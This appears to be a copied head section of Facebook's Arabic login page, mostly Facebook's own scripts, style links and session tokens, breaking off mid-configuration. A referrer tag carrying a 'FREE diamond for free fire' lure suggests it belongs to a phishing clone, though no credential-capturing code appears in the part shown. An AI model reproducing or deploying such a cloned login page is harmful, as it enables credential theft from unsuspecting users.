<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">

<head>
	<meta charset="utf-8" />
	<meta name="referrer" content="FREE diamond for free fire" id="meta_referrer" />
	<script nonce="VWgCIkTZ">
		window._cstart = +new Date();
	</script>
	<script nonce="VWgCIkTZ">
		function envFlush(a) {
			function b(b) {
				for (var c in a) b[c] = a[c]
			}
			window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
		}
		envFlush({
			"ajaxpipe_token": "AXjT0Eh5Wm0SNwouWX0",
			"timeslice_heartbeat_config": {
				"pollIntervalMs": 33,
				"idleGapThresholdMs": 60,
				"ignoredTimesliceNames": {
					"requestAnimationFrame": true,
					"Event listenHandler mousemove": true,
					"Event listenHandler mouseover": true,
					"Event listenHandler mouseout": true,
					"Event listenHandler scroll": true
				},
				"isHeartbeatEnabled": true,
				"isArtilleryOn": false
			},
			"shouldLogCounters": true,
			"timeslice_categories": {
				"react_render": true,
				"reflow": true
			},
			"sample_continuation_stacktraces": true,
			"dom_mutation_flag": true,
			"gk_requirelazy_mem": true,
			"stack_trace_limit": 30,
			"timesliceBufferSize": 5000,
			"show_invariant_decoder": false,
			"compat_iframe_token": "AQ5dwmf9oDcoW1c9Krg",
			"isCQuick": false
		});
	</script>
	<style nonce="VWgCIkTZ"></style>
	<script nonce="VWgCIkTZ">
		__DEV__ = 0;
		CavalryLogger = window.CavalryLogger || function (a) {
			this.lid = a, this.transition = !1, this.metric_collected = !1, this.is_detailed_profiler = !1, this.instrumentation_started = !1, this.pagelet_metrics = {}, this.events = {}, this.ongoing_watch = {}, this.values = {
				t_cstart: window._cstart
			}, this.piggy_values = {}, this.bootloader_metrics = {}, this.resource_to_pagelet_mapping = {}, this.initializeInstrumentation && this.initializeInstrumentation()
		}, CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
			this.is_detailed_profiler = a;
			return this
		}, CavalryLogger.prototype.setTTIEvent = function (a) {
			this.tti_event = a;
			return this
		}, CavalryLogger.prototype.setValue = function (a, b, c, d) {
			d = d ? this.piggy_values : this.values;
			(typeof d[a] === "undefined" || c) && (d[a] = b);
			return this
		}, CavalryLogger.prototype.getLastTtiValue = function () {
			return this.lastTtiValue
		}, CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function (a, b, c, d) {
			this.mark(a);
			var e = this.values.t_cstart || this.values.t_start;
			e = d ? e + d : CavalryLogger.now();
			this.setValue(a, e, b, c);
			this.tti_event && a == this.tti_event && (this.lastTtiValue = e, this.setTimeStamp("t_tti", b));
			return this
		}, CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function (a) {
			console.timeStamp(a)
		} : function () { }, CavalryLogger.prototype.addPiggyback = function (a, b) {
			this.piggy_values[a] = b;
			return this
		}, CavalryLogger.instances = {}, CavalryLogger.id = 0, CavalryLogger.getInstance = function (a) {
			typeof a === "undefined" && (a = CavalryLogger.id);
			CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
			return CavalryLogger.instances[a]
		}, CavalryLogger.setPageID = function (a) {
			if (CavalryLogger.id === 0) {
				var b = CavalryLogger.getInstance();
				CavalryLogger.instances[a] = b;
				CavalryLogger.instances[a].lid = a;
				delete CavalryLogger.instances[0]
			}
			CavalryLogger.id = a
		}, CavalryLogger.now = function () {
			return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime()
		}, CavalryLogger.prototype.measureResources = function () { }, CavalryLogger.prototype.profileEarlyResources = function () { }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function () { }, CavalryLogger.start_js = function () { }, CavalryLogger.done_js = function () { };
		CavalryLogger.getInstance().setTTIEvent("t_domcontent");
		CavalryLogger.prototype.measureResources = function (a, b) {
			if (!this.log_resources) return;
			var c = "bootload/" + a.name;
			if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
			var d = CavalryLogger.now();
			this.ongoing_watch[c] = d;
			"start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
			b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
			if (a.type === "js") {
				c = "js_exec/" + a.name;
				this.ongoing_watch[c] = d
			}
		}, CavalryLogger.prototype.stopWatch = function (a) {
			if (this.ongoing_watch[a]) {
				var b = CavalryLogger.now(),
					c = b - this.ongoing_watch[a];
				this.bootloader_metrics[a] = c;
				var d = this.piggy_values;
				a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0), d.resources_downloaded || (d.resources_downloaded = 0), d.t_resource_download += c, d.resources_downloaded += 1, d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
				delete this.ongoing_watch[a]
			}
			return this
		}, CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
			var a = {};
			Object.values(window.CavalryLogger.instances).forEach(function (b) {
				b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
			});
			return a
		}, CavalryLogger.start_js = function (a) {
			for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
		}, CavalryLogger.done_js = function (a) {
			for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
		}, CavalryLogger.prototype.profileEarlyResources = function (a) {
			for (var b = 0; b < a.length; b++) this.measureResources({
				name: a[b][0],
				type: a[b][1] ? "js" : ""
			}, "_EF_")
		};
		CavalryLogger.getInstance().log_resources = true;
		CavalryLogger.getInstance().setIsDetailedProfiler(true);
		window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
	</script>
	<noscript>
		<meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" />
	</noscript>
	<link rel="manifest" href="/data/manifest/" crossorigin="use-credentials" />
	<title id="pageTitle">فيسبوك - تسجيل الدخول أو الاشتراك</title>
	<meta property="og:site_name" content="Facebook" />
	<meta property="og:url" content="https://www.facebook.com/" />
	<meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
	<meta property="og:locale" content="ar_AR" />
	<meta name="description"
		content="&#x642;&#x645; &#x628;&#x62a;&#x633;&#x62c;&#x64a;&#x644; &#x627;&#x644;&#x62f;&#x62e;&#x648;&#x644; &#x625;&#x644;&#x649; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643; &#x644;&#x628;&#x62f;&#x621; &#x627;&#x644;&#x645;&#x634;&#x627;&#x631;&#x643;&#x629; &#x648;&#x627;&#x644;&#x62a;&#x648;&#x627;&#x635;&#x644; &#x645;&#x639; &#x623;&#x635;&#x62f;&#x642;&#x627;&#x626;&#x643; &#x648;&#x639;&#x627;&#x626;&#x644;&#x62a;&#x643; &#x648;&#x627;&#x644;&#x623;&#x634;&#x62e;&#x627;&#x635; &#x627;&#x644;&#x630;&#x64a;&#x646; &#x62a;&#x639;&#x631;&#x641;&#x647;&#x645;." />
	<link rel="canonical" href="https://www.facebook.com/" />
	<link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/yK/l/1,cross/ykIKCC0i1lo.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="/uaktyf" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/l/1,cross/3b4zD7Hav6i.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="FWQ5zbL" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/yW/l/1,cross/oMDvHENLDyA.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="lfTYLcL" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/y5/l/1,cross/zpuhxOZm2cy.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="6SayXSh" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/yN/l/1,cross/B4foWzYuK2d.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="cJR20wj" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/1,cross/r9Zm00xP6MD.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="v3RBMPB" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/1,cross/QceiG7DyPif.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="Exs+c6w" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/l/1,cross/PnuEuauFqCy.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="WTnViMe" data-nonblocking="1" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/yg/l/1,cross/bLo49mCUayX.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="GYAkcUG" data-nonblocking="1" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/yb/l/1,cross/nF5MLVn3p87.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="RkcVXNo" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet"
		href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/l/1,cross/KHFwP3wSXUo.css?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="9rNH2FC" crossorigin="anonymous" />
	<script src="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/2ql0afcNnyC.js?_nc_x=Ij3Wp8lg5Kz"
		data-bootloader-hash="V0BOBL2" crossorigin="anonymous" nonce="VWgCIkTZ"></script>
	<script nonce="VWgCIkTZ">
		requireLazy(["HasteSupportData"], function (m) {
			m.handle({
				"clpData": {
					"1814852": {
						"r": 1
					},
					"1949898": {
						"r": 1
					},
					"1848815": {
						"r": 10000,
						"s": 1
					},
					"1744178": {
						"r": 1,
						"s": 1
					}
				},
				"gkxData": {
					"708253": {
						"result": false,
						"hash": "AT5n4hBL3YTMnQWtWzo"
					},
					"996940": {
						"result": false,
						"hash": "AT7opYuEGy3sjG1a0L4"
					},
					"1224637": {
						"result": false,
						"hash": "AT7JRluWxuwDm3XzzOM"
					},
					"1263340": {
						"result": false,
						"hash": "AT5bwizWgDaFQudmD5k"
					},
					"676837": {
						"result": false,
						"hash": "AT4N8wBZA8ctCdHwIvA"
					},
					"676920": {
						"result": true,
						"hash": "AT497IX4gOFG8gZey3Y"
					},
					"1073500": {
						"result": true,
						"hash": "AT7aJmfnqWyioxOO3LM"
					},
					"1857581": {
						"result": false,
						"hash": "AT5yTxGMp6le0PAt-Ck"
					},
					"676838": {
						"result": false,
						"hash": "AT6nN1ehT9yq-2q66_Y"
					},
					"1217157": {
						"result": false,
						"hash": "AT6B7YmllOsArnK6iJA"
					},
					"1554827": {
						"result": false,
						"hash": "AT7zueGLhGo0cT5x0cI"
					},
					"1738486": {
						"result": false,
						"hash": "AT4cX37oQco6DwhUmog"
					}
				}
			})
		});
		requireLazy(["TimeSliceImpl", "ServerJS"], function (TimeSlice, ServerJS) {
			(new ServerJS()).handle({
				"define": [
					["URLFragmentPreludeConfig", [], {
						"hashtagRedirect": true,
						"fragBlacklist": ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"]
					}, 137],
					["BootloaderConfig", [], {
						"deferBootloads": false,
						"jsRetries": [200, 500],
						"jsRetryAbortNum": 2,
						"jsRetryAbortTime": 5,
						"silentDups": false,
						"hypStep4": false
					}, 329],
					["CSSLoaderConfig", [], {
						"timeout": 5000,
						"modulePrefix": "BLCSS:",
						"loadEventSupported": true
					}, 619],
					["CookieCoreConfig", [], {
						"c_user": {
							"s": "None"
						},
						"cppo": {
							"t": 86400,
							"s": "None"
						},
						"dpr": {
							"t": 604800,
							"s": "None"
						},
						"fbl_ci": {
							"t": 31536000,
							"s": "None"
						},
						"fbl_cs": {
							"t": 31536000,
							"s": "None"
						},
						"fbl_st": {
							"t": 31536000,
							"s": "Strict"
						},
						"i_user": {
							"s": "None"
						},
						"js_ver": {
							"t": 604800,
							"s": "None"
						},
						"locale": {
							"t": 604800,
							"s": "None"
						},
						"m_pixel_ratio": {
							"t": 604800,
							"s": "None"
						},
						"noscript": {
							"s": "None"
						},
						"presence": {
							"t": 2592000,
							"s": "None"
						},
						"sfau": {
							"s": "None"
						},
						"usida": {
							"s": "None"
						},
						"vpd": {
							"t": 5184000,
							"s": "Lax"
						},
						"wd": {
							"t": 604800,
							"s": "Lax"
						},
						"x-referer": {
							"s": "None"
						},
						"x-src": {
							"t": 1,
							"s": "None"
						}
					}, 2104],
					["CurrentCommunityInitialData", [], {}, 490],
					["CurrentEnvironment", [], {
						"facebookdotcom": true,
						"messengerdotcom": false,
						"workplacedotcom": false
					}, 827],
					["CurrentUserInitialData", [], {
						"ACCOUNT_ID": "0",
						"USER_ID": "0",
						"NAME": "",
						"SHORT_NAME": null,
						"IS_BUSINESS_PERSON_ACCOUNT": false,
						"HAS_SECONDARY_BUSINESS_PERSON": false,
						"IS_MESSENGER_ONLY_USER": false,
						"IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
						"IS_MESSENGER_CALL_GUEST_USER": false,
						"IS_WORK_MESSENGER_CALL_GUEST_USER": false,
						"APP_ID": "256281040558",
						"IS_BUSINESS_DOMAIN": false
					}, 270],
					["DTSGInitialData", [], {}, 258],
					["ISB", [], {}, 330],
					["LSD", [], {
						"token": "AVqb3l_fMGo"
					}, 323],
					["ServerNonce", [], {
						"ServerNonce": "wDLWIV2nn-WYh0ZMeLSlCw"
					}, 141],
					["SiteData", [], {
						"server_revision": 1004120961,
						"client_revision": 1004120961,
						"tier": "",
						"push_phase": "C3e",
						"pkg_cohort": "PHASED:DEFAULT",
						"haste_session": "18824.PHASED:DEFAULT.2.0.0.0",
						"pr": 1.5,
						"haste_site": "www",
						"be_one_ahead": false,
						"ir_on": true,
						"is_rtl": true,
						"is_comet": false,
						"is_experimental_tier": false,
						"is_jit_warmed_up": true,
						"hsi": "6985657454491897372-0",
						"semr_host_bucket": "5",
						"bl_hash_version": 2,
						"skip_rd_bl": true,
						"comet_env": 0,
						"spin": 4,
						"__spin_r": 1004120961,
						"__spin_b": "trunk",
						"__spin_t": 1626475121,
						"vip": "102.132.97.35"
					}, 317],
					["SprinkleConfig", [], {
						"param_name": "jazoest",
						"version": 2,
						"should_randomize": false
					}, 2111],
					["UserAgentData", [], {
						"browserArchitecture": "64",
						"browserFullVersion": "91.0.4472.124",
						"browserMinorVersion": 0,
						"browserName": "Chrome",
						"browserVersion": 91,
						"deviceName": "Unknown",
						"engineName": "WebKit",
						"engineVersion": "537.36",
						"platformArchitecture": "64",
						"platformName": "Windows",
						"platformVersion": "10",
						"platformFullVersion": "10"
					}, 527],
					["PromiseUsePolyfillSetImmediateGK", [], {
						"www_always_use_polyfill_setimmediate": false
					}, 2190],
					["KSConfig", [], {
						"killed": {
							"__set": ["MLHUB_FLOW_AUTOREFRESH_SEARCH", "NEKO_DISABLE_CREATE_FOR_SAP", "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT", "EO_SRT_HELPDESK_DASHBOARD_DISABLE_UNUSED_TAB_IN_RIGHT_PANEL", "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING", "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING", "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE", "ADS_TEMPLATE_UNIFICATION_IN_IG_STORIES", "DCP_CYCLE_COUNT_CLASSIFICATION_UI", "BUY_AT_UI_LINE_DELETE", "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API", "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION", "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME", "ADS_STORE_VISITS_METRICS_DEPRECATION", "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER", "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION", "NEKO_ENABLE_RESET_SAP_FOR_CREATE_AD_SET_CONTEXTUAL", "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS", "LAB_NET_NEW_UI_RELEASE", "HELPDESK_USE_XDS_SEARCHABLE_INPUT_FOR_WORKFLOW", "POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "SRT_BANZAI_SRT_CORE_LOGGER", "SRT_BANZAI_SRT_MAIN_LOGGER", "SIMPL_SAMPLING_HEALTH_CARD", "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES", "POCKET_MONSTERS_UPDATE_NAME", "ADS_INTEGRATION_PORTAL_RELAY_LIVE", "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE", "INTERN_TYPEAHEAD_USE_RELAY_ENVIRONMENT_FROM_CONTEXT", "WIT_CCPA_NOTICE_UPDATE", "MESSENGER_WEB_DISABLE_REQUEST_TIMEOUT"]
						},
						"ko": {
							"__set": ["3OsLvnSHNTt", "1G7wJ6bJt9K", "9NpkGYwzrPG", "6fHw06UmAMW", "3oh5Mw86USj", "8NAceEy9JZo", "7FOIzos6XJX", "6xuJHOrdskA", "75fREERrb3F", "rf8JEPGgOi", "4j36SVzvP3w", "4NSq3ZC4ScE", "53gCxKq281G", "3yzzwBY7Npj", "1onzIv0jH6H", "8PlKuowafe8", "1ntjZ2zgf03", "4SIH2GRVX5W", "2dhqRnqXGLQ", "2WgiNOrHVuC", "amKHb4Cw4WI", "5mNEXob0nTj", "8rDvN9vWdAK", "9cL5o2kjfZo", "5BdzWGmfvrA", "DDZhogI19W", "aDayprn6pbH", "acrJTh9WGdp", "1oOE64fL4wO", "9Gd8qgRxn8z", "MPMaqnqZ9c", "4MzX0ipjWq", "5XCz1h9Iaw3", "7r6mSP7ofr2", "5zgf0XOYSz7", "6DGPLrRdyts", "65QXccYPZEf", "4Dw9FnRd3R6", "afo9WVJs5sX"]
						}
					}, 2580],
					["JSErrorLoggingConfig", [], {
						"appId": 256281040558,
						"extra": [],
						"reportInterval": 50,
						"sampleWeight": null,
						"sampleWeightKey": "__jssesw"
					}, 2776],
					["DataStoreConfig", [], {
						"expandoKey": "__FB_STORE",
						"useExpando": true
					}, 2915],
					["CookieCoreLoggingConfig", [], {
						"maximumIgnorableStallMs": 16.67,
						"sampleRate": 9.7e-5,
						"sampleRateClassic": 1.0e-10,
						"sampleRateFastStale": 1.0e-8
					}, 3401],
					["ImmediateImplementationExperiments", [], {
						"prefer_pass_channel": true
					}, 3419],
					["DTSGInitData", [], {
						"token": "",
						"async_get_token": ""
					}, 3515],
					["UriNeedRawQuerySVConfig", [], {
						"uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com", "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th", "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com", "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com", "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx", "bestbuy.com.mx", "booking.com"]
					}, 3871],
					["InitialCookieConsent", [], {
						"deferCookies": false,
						"initialConsent": {
							"__set": [1, 2]
						},
						"noCookies": false,
						"shouldShowCookieBanner": false
					}, 4328],
					["TrustedTypesConfig", [], {
						"useTrustedTypes": false,
						"reportOnly": false
					}, 4548],
					["WebConnectionClassServerGuess", [], {
						"connectionClass": "GOOD"
					}, 4705],
					["CometAltpayJsSdkIframeAllowedDomains", [], {
						"allowed_domains": ["https:\/\/live.adyen.com", "https:\/\/integration-facebook.payu.in", "https:\/\/facebook.payulatam.com", "https:\/\/secure.payu.com", "https:\/\/facebook.dlocal.com", "https:\/\/buy2.boku.com"]
					}, 4920],
					["BootloaderEndpointConfig", [], {
						"debugNoBatching": false,
						"endpointURI": "https:\/\/www.facebook.com\/ajax\/bootloader-endpoint\/"
					}, 5094],
					["BigPipeExperiments", [], {
						"link_images_to_pagelets": false,
						"enable_bigpipe_plugins": false
					}, 907],
					["AsyncRequestConfig", [], {
						"retryOnNetworkError": "1",
						"useFetchStreamAjaxPipeTransport": false
					}, 328],
					["FbtResultGK", [], {
						"shouldReturnFbtResult": true,
						"inlineMode": "NO_INLINE"
					}, 876],
					["IntlPhonologicalRules", [], {
						"meta": {
							"\/_RTL\/": "(([\u0590-\u05bf]|[\u05c0-\u07ff]))",
							"\/_Delim\/": "(\u0001\u200f)",
							"\/_B\/": "([.,!?\\s]|^)",
							"\/_E\/": "([.,!?\\s]|$)"
						},
						"patterns": {
							"\/\u0629_Delim_RTL\/": "\u062a\u0001$2",
							"\/_RTL_Delim(\\s*)_RTL\/": "$1\u0001$4$5",
							"\/_\u0001([^\u0001]*)\u0001\/": "javascript"
						}
					}, 1496],
					["IntlViewerContext", [], {
						"GENDER": 1
					}, 772],
					["NumberFormatConfig", [], {
						"decimalSeparator": "\u066b",
						"numberDelimiter": "\u066c",
						"minDigitsForThousandsSeparator": 4,
						"standardDecimalPatternInfo": {
							"primaryGroupSize": 3,
							"secondaryGroupSize": 3
						},
						"numberingSystemData": {
							"digits": "\u0660\u0661\u0662\u0663\u0664\u0665\u0666\u0667\u0668\u0669"
						}
					}, 54],
					["SessionNameConfig", [], {
						"seed": "1UWK"
					}, 757],
					["ZeroCategoryHeader", [], {}, 1127],
					["ZeroRewriteRules", [], {
						"rewrite_rules": {},
						"whitelist": {
							"\/hr\/r": 1,
							"\/hr\/p": 1,
							"\/zero\/unsupported_browser\/": 1,
							"\/zero\/policy\/optin": 1,
							"\/zero\/optin\/write\/": 1,
							"\/zero\/optin\/legal\/": 1,
							"\/zero\/optin\/free\/": 1,
							"\/about\/privacy\/": 1,
							"\/about\/privacy\/update\/": 1,
							"\/about\/privacy\/update": 1,
							"\/zero\/toggle\/welcome\/": 1,
							"\/zero\/toggle\/nux\/": 1,
							"\/zero\/toggle\/settings\/": 1,
							"\/fup\/interstitial\/": 1,
							"\/work\/landing": 1,
							"\/work\/login\/": 1,
							"\/work\/email\/": 1,
							"\/ai.php": 1,
							"\/js_dialog_resources\/dialog_descriptions_android.json": 0,
							"\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
							"\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
							"\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
							"\/qp\/interstitial\/": 1,
							"\/qp\/action\/redirect\/": 1,
							"\/qp\/action\/close\/": 1,
							"\/zero\/support\/ineligible\/": 1,
							"\/zero_balance_redirect\/": 1,
							"\/zero_balance_redirect": 1,
							"\/zero_balance_redirect\/l\/": 1,
							"\/l.php": 1,
							"\/lsr.php": 1,
							"\/ajax\/dtsg\/": 1,
							"\/checkpoint\/block\/": 1,
							"\/exitdsite": 1,
							"\/zero\/balance\/pixel\/": 1,
							"\/zero\/balance\/": 1,
							"\/zero\/balance\/carrier_landing\/": 1,
							"\/zero\/flex\/logging\/": 1,
							"\/tr": 1,
							"\/tr\/": 1,
							"\/sem_campaigns\/sem_pixel_test\/": 1,
							"\/bookmarks\/flyout\/body\/": 1,
							"\/zero\/subno\/": 1,
							"\/confirmemail.php": 1,
							"\/policies\/": 1,
							"\/mobile\/internetdotorg\/classifier\/": 1,
							"\/zero\/dogfooding": 1,
							"\/xti.php": 1,
							"\/zero\/fblite\/config\/": 1,
							"\/hr\/zsh\/wc\/": 1,
							"\/ajax\/bootloader-endpoint\/": 1,
							"\/mobile\/zero\/carrier_page\/": 1,
							"\/mobile\/zero\/carrier_page\/education_page\/": 1,
							"\/mobile\/zero\/carrier_page\/feature_switch\/": 1,
							"\/mobile\/zero\/carrier_page\/settings_page\/": 1,
							"\/aloha_check_build": 1,
							"\/upsell\/zbd\/softnudge\/": 1,
							"\/mobile\/zero\/af_transition\/": 1,
							"\/mobile\/zero\/af_transition\/action\/": 1,
							"\/mobile\/zero\/freemium\/": 1,
							"\/mobile\/zero\/freemium\/redirect\/": 1,
							"\/mobile\/zero\/freemium\/zero_fup\/": 1,
							"\/4oh4.php": 1,
							"\/autologin.php": 1,
							"\/birthday_help.php": 1,
							"\/checkpoint\/": 1,
							"\/contact-importer\/": 1,
							"\/cr.php": 1,
							"\/legal\/terms\/": 1,
							"\/login.php": 1,
							"\/login\/": 1,
							"\/mobile\/account\/": 1,
							"\/n\/": 1,
							"\/remote_test_device\/": 1,
							"\/upsell\/buy\/": 1,
							"\/upsell\/buyconfirm\/": 1,
							"\/upsell\/buyresult\/": 1,
							"\/upsell\/promos\/": 1,
							"\/upsell\/continue\/": 1,
							"\/upsell\/h\/promos\/": 1,
							"\/upsell\/loan\/learnmore\/": 1,
							"\/upsell\/purchase\/": 1,
							"\/upsell\/promos\/upgrade\/": 1,
							"\/upsell\/buy_redirect\/": 1,
							"\/upsell\/loan\/buyconfirm\/": 1,
							"\/upsell\/loan\/buy\/": 1,
							"\/upsell\/sms\/": 1,
							"\/wap\/a\/channel\/reconnect.php": 1,
							"\/wap\/a\/nux\/wizard\/nav.php": 1,
							"\/wap\/appreg.php": 1,
							"\/wap\/birthday_help.php": 1,
							"\/wap\/c.php": 1,
							"\/wap\/confirmemail.php": 1,
							"\/wap\/cr.php": 1,
							"\/wap\/login.php": 1,
							"\/wap\/r.php": 1,
							"\/zero\/datapolicy": 1,
							"\/a\/timezone.php": 1,
							"\/a\/bz": 1,
							"\/bz\/reliability": 1,
							"\/r.php": 1,
							"\/mr\/": 1,
							"\/reg\/": 1,
							"\/registration\/log\/": 1,
							"\/terms\/": 1,
							"\/f123\/": 1,
							"\/expert\/": 1,
							"\/experts\/": 1,
							"\/terms\/index.php": 1,
							"\/terms.php": 1,
							"\/srr\/": 1,
							"\/msite\/redirect\/": 1,
							"\/fbs\/pixel\/": 1,
							"\/contactpoint\/preconfirmation\/": 1,
							"\/contactpoint\/cliff\/": 1,
							"\/contactpoint\/confirm\/submit\/": 1,
							"\/contactpoint\/confirmed\/": 1,
							"\/contactpoint\/login\/": 1,
							"\/preconfirmation\/contactpoint_change\/": 1,
							"\/help\/contact\/": 1,
							"\/survey\/": 1,
							"\/upsell\/loyaltytopup\/accept\/": 1,
							"\/settings\/": 1,
							"\/lite\/": 1,
							"\/zero_status_update\/": 1,
							"\/operator_store\/": 1,
							"\/upsell\/": 1,
							"\/wifiauth\/login\/": 1
						}
					}, 1478],
					["IntlNumberTypeConfig", [], {
						"impl": "if (n === 0) { return IntlVariations.NUMBER_ZERO; } else if (n === 1) { return IntlVariations.NUMBER_ONE; } else if (n === 2) { return IntlVariations.NUMBER_TWO; } else if (n \u0025 100 >= 3 && n \u0025 100 \u003C= 10) { return IntlVariations.NUMBER_FEW; } else if (n \u0025 100 >= 11 && n \u0025 100 \u003C= 99) { return IntlVariations.NUMBER_MANY; } else { return IntlVariations.NUMBER_OTHER; }"
					}, 3405],
					["ServerTimeData", [], {
						"serverTime": 1626475121914,
						"timeOfRequestStart": 1626475121892.6,
						"timeOfResponseStart": 1626475121892.6
					}, 5943],
					["FbtQTOverrides", [], {
						"overrides": {}
					}, 551],
					["AnalyticsCoreData", [], {
						"device_id": "$^|AcZr9HEyBbpetPtrfV62wOBpL5gxKwpVz-yCGWoVrcxXTpgnsOWYfZtmZd9MnWM0Kvc2ysNpgj16iIVweEhtyNTo3MZhzbNycQ|fd.AcYec0EwkPlq83zeQX8nwce410TTnDN-PbXo9R80otnzD1AAMlh3S2Bebfm6eE_PIHg91w4LbLx1l4_8LbYBFs2i",
						"app_id": "256281040558",
						"enable_bladerunner": false,
						"enable_ack": true,
						"push_phase": "C3e",
						"enable_observer": false
					}, 5237],
					["cr:696703", [], {
						"__rc": [null, "Aa3175P_ECTyZZFJbCykAk52oUoMf7MqHCsaiUcueTB4Z0qbAj_5tJdn8Ffdx6N0sVLwgaBvPkRsG5oHqMqGQtAw7Ig"]
					}, -1],
					["cr:708886", ["EventProfilerImpl"], {
						"__rc": ["EventProfilerImpl", "Aa3175P_ECTyZZFJbCykAk52oUoMf7MqHCsaiUcueTB4Z0qbAj_5tJdn8Ffdx6N0sVLwgaBvPkRsG5oHqMqGQtAw7Ig"]
					}, -1],
					["cr:717822", ["TimeSliceImpl"], {
						"__rc": ["TimeSliceImpl", "Aa3175P_ECTyZZFJbCykAk52oUoMf7MqHCsaiUcueTB4Z0qbAj_5tJdn8Ffdx6N0sVLwgaBvPkRsG5oHqMqGQtAw7Ig"]
					}, -1],
					["cr:806696", ["clearTimeoutBlue"], {
